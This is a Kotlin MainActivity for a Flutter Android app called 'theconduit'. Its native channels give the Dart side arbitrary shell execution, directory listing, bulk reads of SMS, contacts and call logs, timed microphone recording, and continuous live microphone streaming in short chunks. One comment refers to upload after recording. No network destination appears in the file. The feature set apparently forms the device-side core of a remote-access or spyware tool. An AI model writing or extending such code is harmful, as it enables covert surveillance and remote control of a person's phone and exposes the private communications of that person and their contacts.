package com.zeroone.theconduit // أو اسم الحزمة الخاصة بك

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.EventChannel // For EventChannel (Live Audio)
import android.util.Log
import java.io.File
import java.io.FileInputStream // For Live Audio
import java.io.IOException
import android.Manifest
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

// Imports for SMS
import android.provider.Telephony
import android.database.Cursor

// Imports for Contacts
import android.provider.ContactsContract

// Imports for Call Logs
import android.provider.CallLog

// Imports for Microphone & Live Audio
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import java.util.UUID

class MainActivity : FlutterActivity() {
    private val FILES_CHANNEL_NAME = "com.zeroone.theconduit/files"
    private val NATIVE_FEATURES_CHANNEL_NAME = "com.zeroone.theconduit/native_features"
    private val LIVE_AUDIO_EVENT_CHANNEL_NAME = "com.zeroone.theconduit/live_audio_stream" // New EventChannel
    private val TAG = "MainActivity"

    private val REQUEST_CODE_PERMISSIONS = 101
    private val REQUIRED_PERMISSIONS = mutableListOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG, // Added Call Log permission
        Manifest.permission.WRITE_EXTERNAL_STORAGE // For saving recordings before API 29 or temporary live audio chunks
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // add(Manifest.permission.READ_MEDIA_AUDIO) // If targeting API 33+ and accessing general media audio
        }
    }.toTypedArray()

    private var mediaRecorder: MediaRecorder? = null
    private var audioOutputFile: File? = null // For fixed duration recording
    private var liveAudioFile: File? = null // For temporary live audio chunk
    private var liveAudioStreamHandler: LiveAudioStreamHandler? = null
    private val liveAudioHandler = Handler(Looper.getMainLooper())
    private var isStreamingAudio = false


    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        Log.d(TAG, "Configuring Flutter Engine and Method Channels")

        if (!allPermissionsGranted()) {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS)
        }

        // Files Channel (existing)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, FILES_CHANNEL_NAME).setMethodCallHandler { call, result ->
            // ... (الكود الحالي لـ listFiles و executeShell كما هو)
            when (call.method) {
                "listFiles" -> {
                    val path = call.argument<String>("path") ?: context.filesDir.absolutePath
                    Log.d(TAG, "listFiles called for path: $path")
                    try {
                        val directory = File(path)
                        if (!directory.exists()) {
                             Log.w(TAG, "Path does not exist: $path")
                             result.error("INVALID_PATH", "Path does not exist.", null)
                             return@setMethodCallHandler
                        }
                        if (!directory.isDirectory) {
                            Log.w(TAG, "Path is not a directory: $path")
                            result.error("INVALID_PATH", "Path is not a valid directory.", null)
                            return@setMethodCallHandler
                        }
                        if (!directory.canRead()) {
                            Log.w(TAG, "Cannot read directory: $path (Check permissions)")
                            result.error("PERMISSION_DENIED", "Cannot read directory. Check permissions.", null)
                            return@setMethodCallHandler
                        }

                        val filesList = directory.listFiles()?.mapNotNull { file ->
                            mapOf(
                                "name" to file.name,
                                "path" to file.absolutePath,
                                "isDirectory" to file.isDirectory,
                                "size" to file.length(),
                                "lastModified" to file.lastModified(),
                                "canRead" to file.canRead(),
                                "canWrite" to file.canWrite(),
                                "isHidden" to file.isHidden
                            )
                        } ?: emptyList()
                        
                        Log.d(TAG, "Found ${filesList.size} items in $path")
                        result.success(mapOf("files" to filesList, "path" to directory.absolutePath))

                    } catch (e: SecurityException) {
                        Log.e(TAG, "Security error listing files for path $path", e)
                        result.error("PERMISSION_DENIED", "SecurityException: Permission denied for $path.", e.localizedMessage)
                    }
                    catch (e: Exception) {
                        Log.e(TAG, "Error listing files for path $path", e)
                        result.error("LIST_FILES_FAILED", "Failed to list files for $path.", e.localizedMessage)
                    }
                }
                "executeShell" -> {
                    val command = call.argument<String>("command")
                    val args = call.argument<List<String>>("args") ?: emptyList()
                    Log.d(TAG, "executeShell called for command: $command with args: $args")
                    try {
                        if (command.isNullOrEmpty()) {
                            result.error("INVALID_ARGUMENT", "Command cannot be null or empty", null)
                            return@setMethodCallHandler
                        }
                        
                        val processBuilder = ProcessBuilder(listOf(command) + args)
                        processBuilder.redirectErrorStream(true)
                        val process = processBuilder.start()
                        val outputReader = process.inputStream.bufferedReader()
                        val output = StringBuilder()
                        var line: String?
                        while (outputReader.readLine().also { line = it } != null) {
                            output.append(line).append("\n")
                        }
                        process.waitFor()
                        val exitCode = process.exitValue()
                        Log.d(TAG, "Shell command '$command' executed. Exit code: $exitCode. Output (first 200 chars): ${output.toString().take(200)}")
                        result.success(mapOf(
                            "command" to command,
                            "args" to args,
                            "exitCode" to exitCode,
                            "stdout" to output.toString().trim(),
                            "stderr" to "" 
                        ))

                    } catch (ioe: java.io.IOException) {
                         Log.e(TAG, "IOException for command $command (Command not found or permission issue?)", ioe)
                         result.error("EXECUTION_FAILED", "Command not found or IO error for '$command'.", ioe.localizedMessage)
                    } 
                    catch (se: SecurityException) {
                        Log.e(TAG, "SecurityException executing command $command", se)
                        result.error("PERMISSION_DENIED", "SecurityException: Permission denied for executing '$command'.", se.localizedMessage)
                    }
                    catch (e: Exception) {
                        Log.e(TAG, "Error executing shell command $command", e)
                        result.error("EXECUTION_FAILED", "Failed to execute shell command '$command'.", e.localizedMessage)
                    }
                }
                else -> result.notImplemented()
            }
        }

        // Native Features Channel
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_FEATURES_CHANNEL_NAME).setMethodCallHandler { call, result ->
            when (call.method) {
                "getSmsList" -> { //
                    Log.d(TAG, "getSmsList called")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        try {
                            val smsList = mutableListOf<Map<String, Any?>>()
                            val cursor: Cursor? = contentResolver.query(
                                Telephony.Sms.CONTENT_URI,
                                null, 
                                null, 
                                null, 
                                Telephony.Sms.DEFAULT_SORT_ORDER 
                            )
                            cursor?.use { 
                                if (it.moveToFirst()) {
                                    do {
                                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                                        val dateMs = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)) 
                                        
                                        smsList.add(mapOf(
                                            "address" to address,
                                            "body" to body,
                                            "date" to dateMs,
                                            "type" to when(type) {
                                                Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                                                Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                                                Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                                                Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                                                Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
                                                Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                                                else -> "unknown"
                                            }
                                        ))
                                    } while (it.moveToNext() && smsList.size < 200) 
                                }
                            }
                            Log.d(TAG, "Returning ${smsList.size} SMS messages.")
                            result.success(smsList)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error reading SMS list", e)
                            result.error("SMS_READ_FAILED", "Failed to read SMS list.", e.localizedMessage)
                        }
                    } else {
                        Log.w(TAG, "READ_SMS permission not granted.")
                        result.error("PERMISSION_DENIED", "READ_SMS permission not granted.", null)
                    }
                }
                "getContactsList" -> { //
                    Log.d(TAG, "getContactsList called")
                     if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        try {
                            val contactsList = mutableListOf<Map<String, Any?>>()
                            val cursor: Cursor? = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                arrayOf(
                                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                ),
                                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                            )
                            cursor?.use {
                                while (it.moveToNext() && contactsList.size < 500) { 
                                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                                    val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                    contactsList.add(mapOf("name" to name, "number" to number))
                                }
                            }
                            Log.d(TAG, "Returning ${contactsList.size} contacts.")
                            result.success(contactsList)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error reading contacts list", e)
                            result.error("CONTACTS_READ_FAILED", "Failed to read contacts list.", e.localizedMessage)
                        }
                    } else {
                         Log.w(TAG, "READ_CONTACTS permission not granted.")
                        result.error("PERMISSION_DENIED", "READ_CONTACTS permission not granted.", null)
                    }
                }
                "getCallLogsList" -> { // New Method
                    Log.d(TAG, "getCallLogsList called")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                        try {
                            val callLogsList = mutableListOf<Map<String, Any?>>()
                            val projection = arrayOf(
                                CallLog.Calls.NUMBER,
                                CallLog.Calls.TYPE,
                                CallLog.Calls.DATE,
                                CallLog.Calls.DURATION,
                                CallLog.Calls.CACHED_NAME,
                                CallLog.Calls._ID
                            )
                            val cursor: Cursor? = contentResolver.query(
                                CallLog.Calls.CONTENT_URI,
                                projection,
                                null,
                                null,
                                CallLog.Calls.DEFAULT_SORT_ORDER // Recents first
                            )
                            cursor?.use {
                                val numberCol = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                                val typeCol = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                                val dateCol = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
                                val durationCol = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                                val nameCol = it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)

                                while (it.moveToNext() && callLogsList.size < 200) { // Limit results
                                    val number = it.getString(numberCol)
                                    val typeInt = it.getInt(typeCol)
                                    val dateMs = it.getLong(dateCol)
                                    val durationSec = it.getLong(durationCol)
                                    val name = it.getString(nameCol)

                                    val typeStr = when (typeInt) {
                                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                        CallLog.Calls.MISSED_TYPE -> "missed"
                                        CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                                        CallLog.Calls.BLOCKED_TYPE -> "blocked"
                                        else -> "unknown"
                                    }
                                    callLogsList.add(mapOf(
                                        "number" to number,
                                        "type" to typeStr,
                                        "date" to dateMs,
                                        "duration" to durationSec,
                                        "name" to name
                                    ))
                                }
                            }
                            Log.d(TAG, "Returning ${callLogsList.size} call logs.")
                            result.success(callLogsList)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error reading call logs", e)
                            result.error("CALL_LOG_READ_FAILED", "Failed to read call logs.", e.localizedMessage)
                        }
                    } else {
                        Log.w(TAG, "READ_CALL_LOG permission not granted.")
                        result.error("PERMISSION_DENIED", "READ_CALL_LOG permission not granted.", null)
                    }
                }
                "recordAudio" -> { // Existing fixed duration recording
                    val durationSeconds = call.argument<Int>("duration_seconds") ?: 10
                    Log.d(TAG, "recordAudio called for $durationSeconds seconds")

                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                        result.error("PERMISSION_DENIED", "RECORD_AUDIO permission not granted.", null)
                        return@setMethodCallHandler
                    }
                    try {
                        stopRecording() // Stop any previous recording

                        val outputDir = context.cacheDir 
                        audioOutputFile = File.createTempFile("recording_", ".m4a", outputDir) // Use .m4a for AAC

                        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            MediaRecorder(context)
                        } else {
                            @Suppress("DEPRECATION")
                            MediaRecorder()
                        }
                        
                        mediaRecorder?.apply {
                            setAudioSource(MediaRecorder.AudioSource.MIC)
                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4) // MPEG_4 container for AAC
                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC) // AAC encoder
                            setAudioSamplingRate(16000) // Common sampling rate for voice
                            setAudioEncodingBitRate(64000) // 64 kbps
                            setOutputFile(audioOutputFile!!.absolutePath)
                            prepare()
                            start()
                        }
                        Log.d(TAG, "Audio recording started. Output file: ${audioOutputFile!!.absolutePath}")
                        
                        Handler(Looper.getMainLooper()).postDelayed({
                            val path = stopRecording() // This also releases the recorder
                            if (path != null) {
                                Log.d(TAG, "Fixed duration recording finished. Path: $path")
                                result.success(mapOf("filePath" to path, "status" to "completed"))
                            } else {
                                result.error("RECORDING_STOP_FAILED", "Failed to stop recording or file path is null.", null)
                            }
                        }, durationSeconds * 1000L)

                    } catch (e: IOException) {
                        Log.e(TAG, "IOException during audio recording setup", e)
                        result.error("RECORDING_IO_FAILED", "IOException: ${e.message}", e.localizedMessage)
                         stopRecording() 
                    } catch (e: IllegalStateException) {
                        Log.e(TAG, "IllegalStateException during audio recording", e)
                        result.error("RECORDING_STATE_FAILED", "IllegalStateException: ${e.message}", e.localizedMessage)
                         stopRecording() 
                    } catch (e: Exception) {
                        Log.e(TAG, "Generic error during audio recording", e)
                        result.error("RECORDING_FAILED", "Failed to record audio: ${e.message}", e.localizedMessage)
                         stopRecording() 
                    }
                }
                "startLiveAudioStream" -> { // New method for live audio
                    Log.d(TAG, "startLiveAudioStream called")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                        result.error("PERMISSION_DENIED", "RECORD_AUDIO permission not granted.", null)
                        return@setMethodCallHandler
                    }
                    if (isStreamingAudio) {
                        Log.w(TAG, "Live audio streaming is already active.")
                        result.error("ALREADY_STREAMING", "Live audio streaming is already active.", null)
                        return@setMethodCallHandler
                    }
                    try {
                        val outputDir = context.cacheDir
                        liveAudioFile = File(outputDir, "live_chunk_${UUID.randomUUID()}.m4a")

                        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            MediaRecorder(context)
                        } else {
                            @Suppress("DEPRECATION")
                            MediaRecorder()
                        }

                        mediaRecorder?.apply {
                            setAudioSource(MediaRecorder.AudioSource.MIC)
                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4) // MPEG_4 can contain AAC
                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC) // Standard AAC
                            setAudioSamplingRate(16000) // Or 44100 for higher quality if needed
                            setAudioChannels(1) // Mono
                            setAudioEncodingBitRate(32000) // 32 kbps or 64 kbps for voice
                            setOutputFile(liveAudioFile!!.absolutePath)
                            setMaxDuration(1500) // Record in 1.5-second chunks (adjust as needed)

                            setOnInfoListener { _, what, _ ->
                                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                                    Log.d(TAG, "Max duration reached for live audio chunk.")
                                    processLiveAudioChunk()
                                }
                            }
                            prepare()
                            start()
                        }
                        isStreamingAudio = true
                        Log.d(TAG, "Live audio streaming started. Temp chunk file: ${liveAudioFile!!.absolutePath}")
                        result.success("Live audio streaming started.")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error starting live audio stream", e)
                        isStreamingAudio = false
                        mediaRecorder?.release()
                        mediaRecorder = null
                        result.error("LIVE_AUDIO_START_FAILED", "Failed to start live audio: ${e.message}", null)
                    }
                }
                "stopLiveAudioStream" -> { // New method
                    Log.d(TAG, "stopLiveAudioStream called")
                    stopLiveStreaming()
                    result.success("Live audio streaming stopped.")
                }
                else -> result.notImplemented()
            }
        }

        // Event Channel for Live Audio
        liveAudioStreamHandler = LiveAudioStreamHandler(this)
        EventChannel(flutterEngine.dartExecutor.binaryMessenger, LIVE_AUDIO_EVENT_CHANNEL_NAME).setStreamHandler(liveAudioStreamHandler)


        Log.d(TAG, "All Method Channels configured.")
    }

    private fun processLiveAudioChunk() {
        if (!isStreamingAudio || liveAudioFile == null || mediaRecorder == null) return

        Log.d(TAG, "Processing live audio chunk: ${liveAudioFile!!.path}")
        try {
            // Stop current recording segment
            mediaRecorder?.apply {
                stop()
                reset() // Reset for next segment
            }

            // Send the recorded chunk
            val chunkBytes = liveAudioFile!!.readBytes()
            liveAudioStreamHandler?.sendAudioChunk(chunkBytes)
            Log.d(TAG, "Sent audio chunk of size: ${chunkBytes.size} bytes")

            // Delete the temp chunk file
            liveAudioFile!!.delete()


            // Prepare and start next segment if still streaming
            if (isStreamingAudio) {
                liveAudioFile = File(context.cacheDir, "live_chunk_${UUID.randomUUID()}.m4a")
                mediaRecorder?.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(16000)
                    setAudioChannels(1)
                    setAudioEncodingBitRate(32000)
                    setOutputFile(liveAudioFile!!.absolutePath)
                    setMaxDuration(1500) // Same duration for next chunk
                    // setOnInfoListener is already set
                    prepare()
                    start()
                }
                Log.d(TAG, "Started next live audio chunk recording.")
            } else {
                mediaRecorder?.release()
                mediaRecorder = null
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error processing live audio chunk", e)
            // Attempt to gracefully stop if error occurs
            stopLiveStreaming()
        }
    }


    private fun stopLiveStreaming() {
        if (isStreamingAudio) {
            isStreamingAudio = false
            liveAudioHandler.removeCallbacksAndMessages(null) // Remove any pending runnables
            try {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                Log.d(TAG, "Live audio streaming stopped and recorder released.")
            } catch (e: IllegalStateException) {
                Log.e(TAG, "Error stopping live media recorder", e)
            } finally {
                mediaRecorder = null
                liveAudioFile?.delete() // Clean up any remaining temp file
                liveAudioFile = null
            }
        }
    }

    private fun allPermissionsGranted() = REQUIRED_PERMISSIONS.all {
        ContextCompat.checkSelfPermission(baseContext, it) == PackageManager.PERMISSION_GRANTED
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (allPermissionsGranted()) {
                Log.d(TAG, "All required permissions granted by user.")
            } else {
                Log.w(TAG, "Not all required permissions were granted by the user.")
            }
        }
    }

    // For fixed duration recording
    private fun stopRecording(): String? { //
        var path: String? = null
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            path = audioOutputFile?.absolutePath
            Log.d(TAG, "Audio recording stopped. File: $path")
        } catch (e: IllegalStateException) {
            Log.e(TAG, "IllegalStateException on stopRecording (already stopped or not started?)", e)
        } catch (e: RuntimeException) { 
            Log.e(TAG, "RuntimeException on stopRecording", e)
        } finally {
            mediaRecorder = null // Ensure it's nullified for both fixed and live recording
            // For fixed recording, Flutter side will manage deletion after upload.
        }
        return path
    }


    override fun onDestroy() {
        stopRecording() // Stop fixed duration recorder
        stopLiveStreaming() // Stop live stream recorder
        super.onDestroy()
    }
}

// EventChannel Handler for Live Audio
class LiveAudioStreamHandler(private val activity: MainActivity) : EventChannel.StreamHandler {
    private var eventSink: EventChannel.EventSink? = null
    private val TAG = "LiveAudioStreamHandler"

    override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
        eventSink = events
        Log.d(TAG, "LiveAudioStreamHandler: onListen called")
    }

    override fun onCancel(arguments: Any?) {
        eventSink = null
        Log.d(TAG, "LiveAudioStreamHandler: onCancel called")
        // Optionally, tell MainActivity to stop streaming if Flutter cancels
        // activity.stopLiveStreaming() // Consider the implications of this
    }

    fun sendAudioChunk(chunk: ByteArray) {
        Handler(Looper.getMainLooper()).post {
            eventSink?.success(chunk)
        }
    }
     fun sendError(errorCode: String, errorMessage: String, errorDetails: Any?) {
        Handler(Looper.getMainLooper()).post {
            eventSink?.error(errorCode, errorMessage, errorDetails)
        }
    }
}